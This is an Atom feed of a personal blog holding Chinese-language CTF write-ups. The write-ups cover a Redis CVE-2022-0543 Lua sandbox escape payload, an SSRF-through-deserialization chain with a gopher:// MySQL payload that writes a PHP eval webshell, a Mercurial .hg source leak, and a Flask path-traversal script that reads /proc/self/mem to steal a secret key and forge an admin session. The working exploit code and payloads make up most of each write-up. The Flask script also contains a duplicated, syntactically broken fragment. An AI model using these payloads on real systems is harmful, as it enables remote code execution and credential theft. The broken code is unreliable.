<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MyBlog</title>
  
  <subtitle>MyBlog</subtitle>
  <link href="http://1768161086.github,io/atom.xml" rel="self"/>
  
  <link href="http://1768161086.github,io/"/>
  <updated>2025-05-23T13:47:33.296Z</updated>
  <id>http://1768161086.github,io/</id>
  
  <author>
    <name>userq</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Redis命令执行以及其历史漏洞</title>
    <link href="http://1768161086.github,io/2025/05/23/Redis%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/"/>
    <id>http://1768161086.github,io/2025/05/23/Redis%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BB%A5%E5%8F%8A%E5%85%B6%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/</id>
    <published>2025-05-23T13:44:29.000Z</published>
    <updated>2025-05-23T13:47:33.296Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Newctf2024-ez-redis"><a href="#Newctf2024-ez-redis" class="headerlink" title="Newctf2024-ez_redis"></a>Newctf2024-ez_redis</h2><p><img src="https://newstar.wiki/assets/ez_redis_1.C7MGST-A.png" alt="redis 语法示例"></p><p>在这里其实给出了示例，结合题目不难发现就是个 Redis 语法</p><p>如果你有信息收集意识的话还会发现有源码泄露，访问 <code>/www.zip</code> 即可</p><p>关键点在：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_POST[&#x27;eval&#x27;]))&#123;</span><br><span class="line">    $cmd = $_POST[&#x27;eval&#x27;];</span><br><span class="line">    if(preg_match(&quot;/set|php/i&quot;, $cmd))</span><br><span class="line">    &#123;</span><br><span class="line">        $cmd = &#x27;return &quot;u are not newstar&quot;;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $example = new Redis();</span><br><span class="line">    $example-&gt;connect($REDIS_HOST);</span><br><span class="line">    $result = json_encode($example-&gt;eval($cmd));</span><br><span class="line"></span><br><span class="line">    echo &#x27;&lt;h1 class=&quot;subtitle&quot;&gt;结果&lt;/h1&gt;&#x27;;</span><br><span class="line">    echo &quot;&lt;pre&gt;$result&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>搜索 Redis 常⽤利⽤⽅法，发现如果过滤了 <code>set</code> <code>php</code>，那么我们很难通过写 webshell，写⼊计划任务、主从复制来进行 getshell</p><p>于是我们搜索⼀下 Redis 5 的历史漏洞</p><p>发现 CVE-2022-0543 值得⼀试: <a href="https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md">Redis Lua 沙盒绕过命令执行（CVE-2022-0543）</a></p><p>于是我们得到了⼀个 payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&#x27; 0</span><br></pre></td></tr></table></figure><p>由于我们⽹站执⾏的是 redis 命令</p><p>于是去掉外⾯的 eval 即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;id&quot;, &quot;r&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res</span><br></pre></td></tr></table></figure><p><img src="https://newstar.wiki/assets/ez_redis_2.jaPpI5Xy.png" alt="获取到 flag"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Newctf2024-ez-redis&quot;&gt;&lt;a href=&quot;#Newctf2024-ez-redis&quot; class=&quot;headerlink&quot; title=&quot;Newctf2024-ez_redis&quot;&gt;&lt;/a&gt;Newctf2024-ez_redis&lt;/h2&gt;&lt;p&gt;&lt;i</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>gopher协议无密码注入mysql</title>
    <link href="http://1768161086.github,io/2025/05/23/gopher%E5%8D%8F%E8%AE%AE%E6%97%A0%E5%AF%86%E7%A0%81%E6%B3%A8%E5%85%A5mysql/"/>
    <id>http://1768161086.github,io/2025/05/23/gopher%E5%8D%8F%E8%AE%AE%E6%97%A0%E5%AF%86%E7%A0%81%E6%B3%A8%E5%85%A5mysql/</id>
    <published>2025-05-23T13:39:55.000Z</published>
    <updated>2025-05-23T13:42:03.019Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CTFshow-代码审计-web308"><a href="#CTFshow-代码审计-web308" class="headerlink" title="CTFshow 代码审计 web308"></a>CTFshow 代码审计 web308</h2><p>1.题目描述：需要拿shell</p><p>2.代码审计</p><p>3.<strong>SQL注入：</strong></p><p>无明显注入点，无SQL报错信息输出，insert语句都上了waf。SQL注入不可行。</p><p>4.<strong>反序列化写入文件：</strong></p><p>有无过滤的<code>file_put_contents()</code>函数却从未被调用。</p><p>5.<strong>反序列化执行命令：</strong> public function clearCache()</p><p>上了waf，只能输入大小写字母。</p><p>6.在<code>fun.php</code>的<code>checkUpdate()</code>函数中发现了明显的SSRF特征代码，而且没有过滤。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function checkUpdate($url)&#123;</span><br><span class="line">        $ch=curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_HEADER, false);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);</span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);</span><br><span class="line">        $res = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>7.我们把所有有关的代码都整合起来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//【index.php】</span><br><span class="line">$service = unserialize(base64_decode($_COOKIE[&#x27;service&#x27;]));</span><br><span class="line">if($service)&#123;</span><br><span class="line">    $lastVersion=$service-&gt;checkVersion();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【dao.php】</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line"></span><br><span class="line">    public function checkVersion()&#123;</span><br><span class="line">            return checkUpdate($this-&gt;config-&gt;update_url);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【config.php】</span><br><span class="line">class config&#123;</span><br><span class="line">    private $mysql_username=&#x27;root&#x27;;</span><br><span class="line">    //没有密码！！！！！</span><br><span class="line">    private $mysql_password=&#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">    public $update_url = &#x27;https://vip.ctf.show/version.txt&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//【fun.php】</span><br><span class="line">function checkUpdate($url)&#123;</span><br><span class="line">        $ch=curl_init();    </span><br><span class="line">        //...</span><br><span class="line">        $res = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得出我们可以使用SSRF打无密码的mysql。SSRF的payload由<code>/index.php</code>反序列化传入。</p><p>8.反序列化POC：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">    $this-&gt;config=new config();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class config&#123;</span><br><span class="line">     public $update_url = &#x27;SSRF打无密码mysql的payload&#x27;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a= new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Gopherus工具对应文件夹开cmd控制台。工具下载地址<code>https://github.com/tarunkant/Gopherus</code></p><p>9.kali下载Gopherus工具：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/tarunkant/Gopherus</span><br></pre></td></tr></table></figure><p>10.运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 gopherus.py --exploit mysql</span><br></pre></td></tr></table></figure><p>username:root</p><p>execute:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;;</span><br></pre></td></tr></table></figure><p>得到SSRFpayload：</p><p>gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%22%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%22%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%22%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%31%2e%70%68%70%22%3b%01%00%00%00%01</p><p>11.得到payload在index.php执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czoxMDoidXBkYXRlX3VybCI7czo3NjM6ImdvcGhlcjovLzEyNy4wLjAuMTozMzA2L18lYTMlMDAlMDAlMDElODUlYTYlZmYlMDElMDAlMDAlMDAlMDElMjElMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlMDAlNzIlNmYlNmYlNzQlMDAlMDAlNmQlNzklNzMlNzElNmMlNWYlNmUlNjElNzQlNjklNzYlNjUlNWYlNzAlNjElNzMlNzMlNzclNmYlNzIlNjQlMDAlNjYlMDMlNWYlNmYlNzMlMDUlNGMlNjklNmUlNzUlNzglMGMlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNmUlNjElNmQlNjUlMDglNmMlNjklNjIlNmQlNzklNzMlNzElNmMlMDQlNWYlNzAlNjklNjQlMDUlMzIlMzclMzIlMzUlMzUlMGYlNWYlNjMlNmMlNjklNjUlNmUlNzQlNWYlNzYlNjUlNzIlNzMlNjklNmYlNmUlMDYlMzUlMmUlMzclMmUlMzIlMzIlMDklNWYlNzAlNmMlNjElNzQlNjYlNmYlNzIlNmQlMDYlNzglMzglMzYlNWYlMzYlMzQlMGMlNzAlNzIlNmYlNjclNzIlNjElNmQlNWYlNmUlNjElNmQlNjUlMDUlNmQlNzklNzMlNzElNmMlNDYlMDAlMDAlMDAlMDMlNzMlNjUlNmMlNjUlNjMlNzQlMjAlMjIlM2MlM2YlNzAlNjglNzAlMjAlNjUlNzYlNjElNmMlMjglMjQlNWYlNTAlNGYlNTMlNTQlNWIlMzElNWQlMjklM2IlM2YlM2UlMjIlMjAlNjklNmUlNzQlNmYlMjAlNmYlNzUlNzQlNjYlNjklNmMlNjUlMjAlMjIlMmYlNzYlNjElNzIlMmYlNzclNzclNzclMmYlNjglNzQlNmQlNmMlMmYlMzElMmUlNzAlNjglNzAlMjIlM2IlMDElMDAlMDAlMDAlMDEiO319</span><br></pre></td></tr></table></figure><p>12.访问1.php,post执行命令得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CTFshow-代码审计-web308&quot;&gt;&lt;a href=&quot;#CTFshow-代码审计-web308&quot; class=&quot;headerlink&quot; title=&quot;CTFshow 代码审计 web308&quot;&gt;&lt;/a&gt;CTFshow 代码审计 web308&lt;/h2&gt;&lt;p&gt;1.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>HG泄露</title>
    <link href="http://1768161086.github,io/2025/05/08/HG%E6%B3%84%E9%9C%B2/"/>
    <id>http://1768161086.github,io/2025/05/08/HG%E6%B3%84%E9%9C%B2/</id>
    <published>2025-05-08T05:09:46.000Z</published>
    <updated>2025-05-08T05:16:24.696Z</updated>
    
    <content type="html"><![CDATA[<h2 id="题目名称：HG"><a href="#题目名称：HG" class="headerlink" title="题目名称：HG"></a>题目名称：HG</h2><p>1.管理员利用Mercurial拉去网站源码</p><p>2.猜测是HG泄露</p><p>3.kali下载dvcs-ripper工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/kost/dvcs-ripper</span><br></pre></td></tr></table></figure><p>4.进入该目录后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl</span><br></pre></td></tr></table></figure><p>5.查看网址的hg泄露</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rip-hg.pl -u http://challenge-137f105811083a40.sandbox.ctfhub.com:10800/.hg</span><br></pre></td></tr></table></figure><p>6.使用tree命令列出刚刚下载的.hg网站目录，发现可疑的文本文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tree .hg</span><br></pre></td></tr></table></figure><p>7.查看可疑的文本文件是否存在此题flag，发现历史版本add flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .hg/last-message.txt</span><br></pre></td></tr></table></figure><p>8.发现历史版本可以使用正则表达式进行关键字查找</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -a -r flag</span><br></pre></td></tr></table></figure><p>9.使用curl命令检查一下data数据中的文本文件，发现此题flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://challenge-137f105811083a40.sandbox.ctfhub.com:10800/flag_1682217975.txt</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;题目名称：HG&quot;&gt;&lt;a href=&quot;#题目名称：HG&quot; class=&quot;headerlink&quot; title=&quot;题目名称：HG&quot;&gt;&lt;/a&gt;题目名称：HG&lt;/h2&gt;&lt;p&gt;1.管理员利用Mercurial拉去网站源码&lt;/p&gt;
&lt;p&gt;2.猜测是HG泄露&lt;/p&gt;
&lt;p&gt;3.k</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>catcat-new【目录穿透+特殊文件】</title>
    <link href="http://1768161086.github,io/2025/05/07/catcat-new%E3%80%90%E7%9B%AE%E5%BD%95%E7%A9%BF%E9%80%8F-%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E3%80%91/"/>
    <id>http://1768161086.github,io/2025/05/07/catcat-new%E3%80%90%E7%9B%AE%E5%BD%95%E7%A9%BF%E9%80%8F-%E7%89%B9%E6%AE%8A%E6%96%87%E4%BB%B6%E3%80%91/</id>
    <published>2025-05-07T13:07:54.000Z</published>
    <updated>2025-05-07T13:46:27.981Z</updated>
    
    <content type="html"><![CDATA[<h2 id="catcat-new【目录穿透-特殊文件】"><a href="#catcat-new【目录穿透-特殊文件】" class="headerlink" title="catcat-new【目录穿透+特殊文件】"></a>catcat-new【目录穿透+特殊文件】</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import uuid</span><br><span class="line">from flask import Flask, request, session, render_template, Markup</span><br><span class="line">from cat import cat</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">app = Flask(</span><br><span class="line">    __name__,</span><br><span class="line">    static_url_path=&#x27;/&#x27;,</span><br><span class="line">    static_folder=&#x27;static&#x27;</span><br><span class="line">)</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(uuid.uuid4()).replace(&quot;-&quot;, &quot;&quot;) + &quot;*abcdefgh&quot;</span><br><span class="line">if os.path.isfile(&quot;/flag&quot;):</span><br><span class="line">    flag = cat(&quot;/flag&quot;)</span><br><span class="line">    os.remove(&quot;/flag&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line">def index():</span><br><span class="line">    detailtxt = os.listdir(&#x27;./details/&#x27;)</span><br><span class="line">    cats_list = []</span><br><span class="line">    for i in detailtxt:</span><br><span class="line">        cats_list.append(i[:i.index(&#x27;.&#x27;)])</span><br><span class="line"></span><br><span class="line">    return render_template(&quot;index.html&quot;, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/info&#x27;, methods=[&quot;GET&quot;, &#x27;POST&#x27;])</span><br><span class="line">def info():</span><br><span class="line">    filename = &quot;./details/&quot; + request.args.get(&#x27;file&#x27;, &quot;&quot;)</span><br><span class="line">    start = request.args.get(&#x27;start&#x27;, &quot;0&quot;)</span><br><span class="line">    end = request.args.get(&#x27;end&#x27;, &quot;0&quot;)</span><br><span class="line">    name = request.args.get(&#x27;file&#x27;, &quot;&quot;)[:request.args.get(&#x27;file&#x27;, &quot;&quot;).index(&#x27;.&#x27;)]</span><br><span class="line"></span><br><span class="line">    return render_template(&quot;detail.html&quot;, catname=name, info=cat(filename, start, end))</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/admin&#x27;, methods=[&quot;GET&quot;])</span><br><span class="line">def admin_can_list_root():</span><br><span class="line">    if session.get(&#x27;admin&#x27;) == 1:</span><br><span class="line">        return flag</span><br><span class="line">    else:</span><br><span class="line">        session[&#x27;admin&#x27;] = 0</span><br><span class="line">        return &quot;NoNoNo&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, debug=False, port=5637)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>由脚本知，定义了一个用于管理员权限验证的路由 <strong><code>/admin</code></strong>，只有当会话中的 <strong><code>admin</code></strong> 值为 1 时，才返回flag。否则，将 <strong><code>admin</code></strong> 值设置为 0，并返回字符串 “NoNoNo”。由此知，此处需要伪造session。</li></ul><p>伪造session并获取flag</p><p>伪造session的必要条件是获取密钥SECRET_KEY。由app.py知secret key在app（<strong>flask对象，存储在堆上</strong>）的config属性中的’SECRET_KEY‘键上。</p><p>此处需要借助几个进程文件相互配合获取堆上的SECRET KEY:</p><ul><li>&#x2F;proc&#x2F;self&#x2F;mem：得到进程的内存内容</li><li>&#x2F;proc&#x2F;self&#x2F;maps：获取当前进程的内存映射关系，通过读该文件的内容可以得到内存代码段基址。</li></ul><p>利用&#x2F;proc&#x2F;self&#x2F;maps的映射信息来确定读的偏移值，通过&#x2F;proc&#x2F;self&#x2F;mem文件读取密钥。</p><p>附上大佬的脚本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"># coding=utf-8</span><br><span class="line">#----------------------------------</span><br><span class="line">###################################</span><br><span class="line">#Edited by lx56@blog.lxscloud.top</span><br><span class="line">###################################</span><br><span class="line">#----------------------------------</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import ast, sys</span><br><span class="line">from abc import ABC</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">url = &quot;http://61.147.171.105:65402/&quot;</span><br><span class="line"> </span><br><span class="line">#此程序只能运行于Python3以上</span><br><span class="line">if sys.version_info[0] &lt; 3: # &lt; 3.0</span><br><span class="line">    raise Exception(&#x27;Must be using at least Python 3&#x27;)</span><br><span class="line"> </span><br><span class="line">#----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ----------------</span><br><span class="line">class MockApp(object):</span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line">        </span><br><span class="line">class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            #Encode a Flask session cookie</span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line">#由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key</span><br><span class="line">s_key = &quot;&quot;</span><br><span class="line">bypass = &quot;../..&quot;</span><br><span class="line">#请求file路由进行读取</span><br><span class="line">map_list = requests.get(url + f&quot;info?file=&#123;bypass&#125;/proc/self/maps&quot;)</span><br><span class="line">map_list = map_list.text.split(&quot;\\n&quot;)</span><br><span class="line">for i in map_list:</span><br><span class="line">    #匹配指定格式的地址</span><br><span class="line">    map_addr = re.match(r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;, i)</span><br><span class="line">    if map_addr:</span><br><span class="line">        start = int(map_addr.group(1), 16)</span><br><span class="line">        end = int(map_addr.group(2), 16)</span><br><span class="line">        print(&quot;Found rw addr:&quot;, start, &quot;-&quot;, end)</span><br><span class="line">        </span><br><span class="line">        #设置起始和结束位置并读取/proc/self/mem</span><br><span class="line">        res = requests.get(f&quot;&#123;url&#125;/info?file=&#123;bypass&#125;/proc/self/mem&amp;start=&#123;start&#125;&amp;end=&#123;end&#125;&quot;)</span><br><span class="line">        #用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey</span><br><span class="line">        if &quot;*abcdefgh&quot; in res.text:</span><br><span class="line">            #正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh</span><br><span class="line">            secret_key = re.findall(&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;, res.text)</span><br><span class="line">            if secret_key:</span><br><span class="line">                print(&quot;Secret Key:&quot;, secret_key[0])</span><br><span class="line">                s_key = secret_key[0]</span><br><span class="line">                break</span><br><span class="line"> ])</span><br><span class="line">                s_key = secret_key[0]</span><br><span class="line">                break</span><br><span class="line"></span><br><span class="line"># 设置session中admin的值为1</span><br><span class="line">data = &#x27;&#123;&quot;admin&quot;:1&#125;&#x27;</span><br><span class="line"># 伪造session</span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Cookie&quot;: &quot;session=&quot; + FSCM.encode(s_key, data)</span><br><span class="line">&#125;</span><br><span class="line"># 请求admin路由</span><br><span class="line">try:</span><br><span class="line">    flag = requests.get(url + &quot;admin&quot;, headers=headers)</span><br><span class="line">    print(&quot;Flag is&quot;, flag.text)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Something error&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;catcat-new【目录穿透-特殊文件】&quot;&gt;&lt;a href=&quot;#catcat-new【目录穿透-特殊文件】&quot; class=&quot;headerlink&quot; title=&quot;catcat-new【目录穿透+特殊文件】&quot;&gt;&lt;/a&gt;catcat-new【目录穿透+特殊文件】&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>php-filter-iconv</title>
